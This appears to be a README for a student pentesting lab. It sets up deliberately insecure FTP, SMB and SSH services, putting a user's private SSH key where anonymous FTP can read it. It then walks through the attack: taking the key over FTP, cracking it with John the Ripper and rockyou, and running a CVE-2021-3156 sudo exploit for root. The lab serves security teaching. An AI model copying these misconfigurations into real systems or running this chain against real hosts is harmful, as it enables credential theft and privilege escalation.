# IC1_projekt
Requirments:
* Docker
* Docker-compose

Install packages
---------------
```
$ chmod +x installPackages.sh
# ./installPackages.sh
```
The script contains the necessary packages for the functionality of the OS.

HTTP server configuration (html files)
---------------
You have to chose which files to use before the server is ran (before you use docker-compose).

Docker (HTTP server)
---------------
```
# docker-compose up -d
```
Docker-compose creates both an ftp and http servers.

FTP server installation
---------------
```
$ chmod +x ftp-server/setupFTP
# ftp-server/setupFTP
```
The main FTP directory is in /home and ownership of the folder is "none", therefore Anonymous user has access to all user data.

SMB server installation
---------------
```
$ chmod +x smb-server/setupSMB
# smb-server/setupSMB
```
The commands above only install the server and shared folders. You still have to add users using the commands below.
```
# smbpasswd -a <username>
```

Set up new user
---------------
### Create new user
- `sudo adduser <username>`... user friendly setting
- OR,
- `sudo useradd -m <username>`... create a new user <username>, `-m` create home directory `/home/<username>/`
- `sudo passwd <username>`... sets a password for the user `<username>`, 

### Generating SSH keys
`ssh-keygen -t rsa -b 2048` 
- `mkdir /home/<username>/.ssh/authorized_keys`
- `cp /home/<username>/.ssh/id_rsa.pub /home/<username>/.ssh/authorized_keys`
- Private key to FTP
  - `mv /home/<username>/.ssh/id_rsa /home/<username>`
  - `chmod +rw /home/<username>/id_rsa`
  - `sudo mv /home/<username>/id_rsa /var/ftp/.ssh/`

### Set /etc/ssh/sshd_config
- `sudo nano /etc/ssh/sshd_config`
  - add `AuthorizedKeysFile %h/.ssh/authorized_keys/id_rsa.pub`
  - No password authentication for user `<username>`:
    - `Match User <username>`
    - `PasswordAuthentication no`    
  - `service ssh restart`

### flags.txt
- `sudo bash -c 'echo "https://www.youtube.com/watch?v=5T5BY1j2MkE" > /home/xpepik/flags.txt'`
- `sudo chmod 600 /home/xpepik/flags.txt`

Instruction for PENTESTING
----------
## GET ssh id_rsa from FTP
```
ftp <IP_target>
username: anonymous
password: anonymous
cd .ssh/
get id_rsa
exit
chmod 600 id_rsa
```

## "Crack" ssh key with John The Ripper
```
$ locate ssh2john.py
$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash 
$ locate rockyou.txt.gz
$ gunzip rockyou.txt.gz
$ john id_rsa.hash -wordlist= rockyou.txt
```

## CVE-2021-3156
- directory contains `hac.c`, `lib.c`, `Makefile`, `README.md`
```
$ cd /home/<username>/CVE-2021-3156/
$ make
$ ./sudo-hax-me-a-sandwich 0
```
